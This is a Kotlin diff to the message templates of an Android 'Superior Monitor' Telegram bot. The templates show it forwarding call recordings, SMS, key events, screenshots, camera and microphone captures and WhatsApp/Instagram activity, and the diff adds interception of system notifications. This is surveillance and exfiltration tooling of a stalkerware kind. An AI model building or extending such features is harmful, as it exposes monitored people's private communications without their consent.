@@ -104,14 +104,16 @@ object BotMessages {
                 *Uptime:* ${metrics["UPTIME"]} | *Current:* ${metrics["CURRENT_TIME"]}
             """.trimIndent()
 
-        fun buildBulkUploadMessage(appName: String): String =
-            """
-            #$appName #Batch
-            ===================
-            📦 *Live Batch Upload*
-            
-            This document contains multiple $appName messages that arrived rapidly.
+        fun buildBulkUploadMessage(appName: String, isSent: Boolean = false): String {
+            val directionText = if (isSent) "were sent rapidly" else "arrived rapidly"
+            return """
+                #$appName #Batch
+                ===================
+                📦 *Live Batch Upload*
+                
+                This document contains multiple $appName messages that $directionText.
             """.trimIndent()
+        }
     }
 
     object Settings {
@@ -130,9 +132,9 @@ object BotMessages {
             if (!prefs.persistentEnforcementEnabled) {
                 return buildMenuHeader("#System #Persistent", "System Warning") + "\n\n" +
                 """
-                    System-level enforcement modifies restricted internal settings. Depending on your Android version and OEM modifications, this feature may cause unexpected behavior, including system UI crashes or soft reboots. 
-                    
-                    Please proceed with caution.
+                System-level enforcement modifies restricted internal settings. Depending on your Android version and OEM modifications, this feature may cause unexpected behavior, including system UI crashes or soft reboots. 
+                
+                Please proceed with caution.
                 """.trimIndent()
             } else {
                 val dataState = formatFeatureState(prefs.forceMobileData, useEmojis = true)
@@ -140,10 +142,10 @@ object BotMessages {
                 val hotspotState = formatFeatureState(prefs.forceHotspot, useEmojis = true)
                 return buildMenuHeader("#System #Persistent", "Persistent Enforcement Dashboard") + "\n\n" +
                 """
-                    *Currently Active Settings*:
-                    *Force Mobile Data*: $dataState
-                    *Force Wi-Fi*: $wifiState
-                    *Force Hotspot*: $hotspotState
+                *Currently Active Settings*:
+                *Force Mobile Data*: $dataState
+                *Force Wi-Fi*: $wifiState
+                *Force Hotspot*: $hotspotState
                 """.trimIndent()
             }
         }
@@ -154,16 +156,18 @@ object BotMessages {
             val callState = formatFeatureState(prefs.callAlertsEnabled, useEmojis = true)
             val smsState = formatFeatureState(prefs.smsAlertsEnabled, useEmojis = true)
             val keyState = formatFeatureState(prefs.keyEventsEnabled, prefs.keyEventsIntervalMin, useEmojis = true)
+            val notifState = formatFeatureState(prefs.notificationEventsEnabled, useEmojis = true)
             
             return buildMenuHeader("#System #BasicUpdates", "Basic Updates Dashboard") + "\n\n" +
             """
-                Forward Upcoming/Outgoing Updates to Telegram Chat.
-                
-                *Currently Active Settings*:
-                *Call Recording*: $recState
-                *Call Events*: $callState
-                *SMS Events*: $smsState
-                *Key Events*: $keyState
+            Forward Upcoming/Outgoing Updates to Telegram Chat.
+            
+            *Currently Active Settings*:
+            *Call Recording*: $recState
+            *Call Events*: $callState
+            *SMS Events*: $smsState
+            *Key Events*: $keyState
+            *Notification Events*: $notifState
             """.trimIndent()
         }
 
@@ -173,10 +177,45 @@ object BotMessages {
             
             return buildMenuHeader("#System #KeyEvents", "Key Events Settings") + "\n\n" +
             """
-                Set an automatic interval for sending Key Events logs, or disable it completely.
-                
-                *Current State*: $state
+            Set an automatic interval for sending Key Events logs, or disable it completely.
+            
+            *Current State*: $state
             """.trimIndent()
+        }
+
+        fun buildNotificationEventsFeaturePrompt(context: Context): String {
+            val prefs = PrefsManager.getInstance(context)
+            val state = formatFeatureState(prefs.notificationEventsEnabled, useEmojis = true)
+            
+            return buildMenuHeader("#System #NotificationEvents", "Notification Events Settings") + "\n\n" +
+            """
+            Intercept incoming system notifications.
+            
+            *Current State*: $state
+            """.trimIndent()
+        }
+
+        fun buildNotificationBlacklistPrompt(context: Context): String {
+            val prefs = PrefsManager.getInstance(context)
+            val blacklist = prefs.notificationBlacklist
+            val socialBlocked = if (prefs.notificationBlockSocialEnabled) {
+                val blocked = mutableListOf<String>()
+                if (prefs.whatsappUpdatesEnabled) blocked.add("com.whatsapp")
+                if (prefs.whatsappBusinessUpdatesEnabled) blocked.add("com.whatsapp.w4b")
+                if (prefs.instagramEnabled) blocked.add("com.instagram.android")
+                blocked.filter { !prefs.notificationSocialUnblocked.contains(it) }
+            } else emptyList()
+            
+            val combined = (blacklist + socialBlocked).distinct()
+            
+            val listStr = if (combined.isEmpty()) "None" else combined.joinToString("\n") { "• `$it`" }
+            
+            return buildMenuHeader("#System #NotificationEvents", "Notification Filter Config") + "\n\n" +
+            """
+            Filter out noisy or unwanted apps from generating notification events.
+            
+            *Currently Blocked Apps*:
+            """.trimIndent() + "\n" + listStr
         }
 
         fun buildCallRecordingMenuPrompt(): String =
@@ -193,13 +232,13 @@ object BotMessages {
             
             return buildMenuHeader("#System #SocialUpdates", "Social Updates Dashboard") + "\n\n" +
             """
-                Forward Upcoming/Outgoing Social Update to Telegram Chat.
-                
-                *Currently Active Settings*:
-                
-                *WhatsApp*: $whatsappState
-                *WhatsApp Business*: $waBusinessState
-                *Instagram*: $instagramState
+            Forward Upcoming/Outgoing Social Update to Telegram Chat.
+            
+            *Currently Active Settings*:
+            
+            *WhatsApp*: $whatsappState
+            *WhatsApp Business*: $waBusinessState
+            *Instagram*: $instagramState
             """.trimIndent()
         }
 
@@ -311,13 +350,13 @@ object BotMessages {
         }
 
         fun buildSnapshotUploadMessage(): String =
-                """
+            """
             #Snapshot #Screencap
             
             ✨ *Routine Snapshot has been Taken!*
             
             - Uploading to Telegram.
-        """.trimIndent()
+            """.trimIndent()
 
         fun buildCameraUploadMessage(tag: String): String {
             val type = if (tag.contains("Front")) "Front Camera" else "Rear Camera"
@@ -331,14 +370,14 @@ object BotMessages {
         }
 
         fun buildNewRecordingUploadedMessage(fileName: String): String =
-                """
+            """
             #Call
             ===================
             *New Recording Uploaded*
             
             *File* : `$fileName`
             *Status* : Online
-        """.trimIndent()
+            """.trimIndent()
 
         fun buildOnDemandCaptureMessage(type: Int): String =
                 when (type) {
@@ -348,23 +387,23 @@ object BotMessages {
                 }
         
         fun buildOfflineQueueSendingMessage(): String =
-                """
+            """
             #Upload #Offline
             ===================
             *Sending Remaining Images*
             
             The queued media files are now being uploaded to Telegram. Please wait.
-        """.trimIndent()
+            """.trimIndent()
 
         fun buildOfflineZipBatchingMessage(count: Int): String =
-                """
+            """
             #Upload #Offline #Batch
             ===================
             📦 *Batching Offline Media*
             
             Found $count offline media files. Compressing into a ZIP archive to optimize upload and prevent spam.
             Attempting to send...
-        """.trimIndent()
+            """.trimIndent()
 
 
     }
@@ -377,14 +416,14 @@ object BotMessages {
         fun buildCallActivityPrompt(): String = "📞 *Fetch Call Activity*\n\n- Select the number of recent calls to fetch."
 
         fun buildFetchSuccessMessage(type: String, count: Int): String =
-                """
+            """
             #Fetch #$type
             ===================
             *Fetch Completed Successfully*
             
             Successfully retrieved $count records.
             Please find the attached document.
-        """.trimIndent()
+            """.trimIndent()
 
         fun buildFetchInProgressMessage(target: String): String = "⏳ *Fetching $target, please wait...*"
 
@@ -403,26 +442,26 @@ object BotMessages {
             """.trimIndent()
         
         fun buildRoutineKeyEventsCaption(): String =
-                """
+            """
             #KeyEvents #Routine
             ===================
             🔄 *Routine Upload* - Here is the periodic Key Events.
-        """.trimIndent()
+            """.trimIndent()
         
         fun buildOfflineRecordingSyncedMessage(fileName: String): String =
-                """
+            """
             #Call #Offline
             ===================
             *Offline Recording Synced*
             
             *File* : `$fileName`
             *Status* : Synced from Offline
-        """.trimIndent()
+            """.trimIndent()
     }
 
     object Alerts {
         fun buildLockedScreenMessage(): String =
-                """
+            """
             #Snapshot #Aborted
             ===================
             ⚠️ *Capture Aborted*
@@ -431,47 +470,47 @@ object BotMessages {
             Taking a screenshot right now would only result in a blank, black image.
             
             Please try your request again when the device is actively being used.
-        """.trimIndent()
+            """.trimIndent()
 
         fun buildConnectionRestoredMessage(): String =
-                """
+            """
             #Network #Online
             ===================
             *Connection Restored*
             
             The device is back online. All services have been restored.
-        """.trimIndent()
+            """.trimIndent()
 
         fun buildRebootMessage(): String =
-                """
+            """
             #Reboot #Connection
             ===================
             *Device Rebooted & Online* 
-        """.trimIndent()
+            """.trimIndent()
 
 
 
         fun buildOfflineMicCaption(): String =
-                """
+            """
             #Microphone #Offline
             ===================
             ⚠️ *Previous recording request was not sent because the device was offline. Here is the recorded file.*
-        """.trimIndent()
+            """.trimIndent()
 
         fun buildUnauthorizedWarningMessage(): String =
-                """
+            """
             *Superior Monitor* - A Personal Monitoring and device control telegram bot
             
             ⚠️ *You are not authorized to use this bot*
             - You will be blocked if you tried 3 access attempts.
-        """.trimIndent()
+            """.trimIndent()
 
         fun buildUnauthorizedBlockedMessage(): String =
-                """
+            """
             *Superior Monitor* - A Personal Monitoring and device control telegram bot
             
             🚫 *User Blocked* - Your request will be ignored from now on.
-        """.trimIndent()
+            """.trimIndent()
 
         private fun buildSocialUpdateMessage(
             appName: String,
@@ -548,7 +587,7 @@ object BotMessages {
                 safeContactName: String,
                 safeNumber: String
         ): String =
-                """
+            """
             #Call
             ===================
             ✨ *Call activity has been detected!*
@@ -558,7 +597,7 @@ object BotMessages {
             *Time* : $timeStr
             *Contact* : $safeContactName
             *Number* : `$safeNumber`
-        """.trimIndent()
+            """.trimIndent()
 
         fun buildSmsMessage(
                 headerAction: String,
@@ -569,7 +608,7 @@ object BotMessages {
                 directionType: String,
                 safeBody: String
         ): String =
-                """
+            """
             #SMS
             ===================
             🔔 *NEW SMS* $headerAction
@@ -579,8 +618,26 @@ object BotMessages {
             *Time*: $timeStr
             *SIM*: $safeCarrierName
             *Type*: $directionType
+            """.trimIndent() + "\n\n*Message*: $safeBody"
 
-            *Message*: $safeBody
-        """.trimIndent()
+        fun buildNotificationMessage(
+                appName: String,
+                packageName: String,
+                title: String,
+                text: String,
+                timeStr: String
+        ): String =
+            """
+            #Notification
+            ===================
+            🔔 *NEW NOTIFICATION*
+            ===================
+
+            *App*: $appName
+            *Package*: `$packageName`
+            *Time*: $timeStr
+
+            *Title*: $title
+            """.trimIndent() + "\n*Content*: " + text
     }
 }
